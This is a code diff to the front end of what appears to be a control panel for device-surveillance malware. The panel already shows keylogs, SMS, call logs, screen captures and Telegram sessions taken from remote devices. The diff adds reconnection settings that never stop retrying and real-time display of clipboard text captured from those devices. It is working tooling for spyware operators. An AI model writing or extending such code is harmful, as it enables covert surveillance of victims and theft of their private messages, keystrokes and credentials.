@@ -232,7 +232,15 @@ function initApp() {
 // ========== WebSocket ==========
 function connectWebSocket() {
   socket = io(API_BASE, {
-    auth: { password: adminPassword }
+    auth: { password: adminPassword },
+    // Low-network resilience: aggressive reconnection settings
+    reconnection: true,
+    reconnectionDelay: 1000,      // Start at 1s
+    reconnectionDelayMax: 5000,   // Cap at 5s (don't wait too long)
+    reconnectionAttempts: Infinity, // Never give up
+    timeout: 10000,               // 10s connect timeout (was default 20s)
+    pingInterval: 5000,           // Ping every 5s to detect dead connections
+    pingTimeout: 10000            // Wait 10s for pong before disconnect
   });
 
   socket.on('connect', () => {
@@ -241,6 +249,8 @@ function connectWebSocket() {
       if (response && response.success) {
         setWsStatus('connected', 'Connected');
         addActivity('ri-link', 'WebSocket connected (authenticated)');
+        // On reconnect, refresh current page data to catch missed updates
+        refreshCurrentPageData();
       } else {
         setWsStatus('disconnected', 'Auth failed');
         addActivity('ri-error-warning-line', 'WebSocket auth failed');
@@ -248,7 +258,24 @@ function connectWebSocket() {
     });
   });
 
-  socket.on('disconnect', () => setWsStatus('disconnected', 'Disconnected'));
+  socket.on('disconnect', (reason) => {
+    setWsStatus('disconnected', 'Reconnecting...');
+    addActivity('ri-wifi-off-line', `WebSocket disconnected: ${reason}`);
+  });
+
+  socket.on('reconnect', (attempt) => {
+    setWsStatus('connected', 'Connected');
+    addActivity('ri-wifi-line', `WebSocket reconnected (attempt ${attempt})`);
+  });
+
+  socket.on('reconnect_attempt', (attempt) => {
+    setWsStatus('disconnected', `Reconnecting... (${attempt})`);
+  });
+
+  socket.on('connect_error', (error) => {
+    setWsStatus('disconnected', 'Reconnecting...');
+    // Silent — don't spam console, reconnection is automatic
+  });
 
   socket.on('clients_count', c => {
     document.getElementById('clientCount').textContent = c;
@@ -449,6 +476,49 @@ function connectWebSocket() {
       }
     }
   });
+
+  // ═══ CLIPBOARD — real-time clipboard capture ═══
+  socket.on('new_clipboard', d => {
+    if (modalDeviceId && d.device_id === modalDeviceId && activeTab === 'clipboard') {
+      allClipboardEntries.unshift({
+        id: Date.now(),
+        device_id: d.device_id,
+        text: d.text,
+        clip_timestamp: d.clip_timestamp,
+        synced_at: d.synced_at
+      });
+      if (allClipboardEntries.length > 500) allClipboardEntries = allClipboardEntries.slice(0, 500);
+      renderClipboard(allClipboardEntries);
+      const countEl = document.getElementById('clipboardCount');
+      if (countEl) {
+        const current = parseInt(countEl.textContent) || 0;
+        countEl.textContent = `${current + 1} entries`;
+      }
+      const tab = document.querySelector('.device-tab[data-tab="clipboard"]');
+      if (tab) { tab.style.background = 'rgba(0,229,255,.15)'; setTimeout(() => tab.style.background = '', 2000); }
+    }
+    addActivity('ri-clipboard-line', `Clipboard on ${d.device_id?.substring(0,8)}...: "${(d.text||'').substring(0,40)}..."`);
+  });
+}
+
+// On WebSocket reconnect, refresh current page data to catch missed updates
+function refreshCurrentPageData() {
+  try {
+    if (currentPage === 'dashboard') { refreshDashboardKPIs(); }
+    if (currentPage === 'connections') { loadConnections(); }
+    if (currentPage === 'keylog') { loadGlobalKeylogs(1); }
+    if (currentPage === 'videos') { loadVideos(); }
+    if (currentPage === 'telegram' && typeof tgCheckStatus === 'function') { tgCheckStatus(); }
+    if (currentPage === 'telegram-adult' && typeof adultTgCheckStatus === 'function') { adultTgCheckStatus(); }
+    // If device modal is open, refresh the active tab's data
+    if (modalDeviceId) {
+      if (activeTab === 'sms') loadSmsMessages(1);
+      else if (activeTab === 'calls') loadCallLogs(1);
+      else if (activeTab === 'clipboard') loadClipboard(1);
+      else if (activeTab === 'keylog') loadDeviceKeylogs(1);
+      else if (activeTab === 'screen') loadScreenCaptures(1);
+    }
+  } catch (_) {}
 }
 
 function setWsStatus(state, label) {
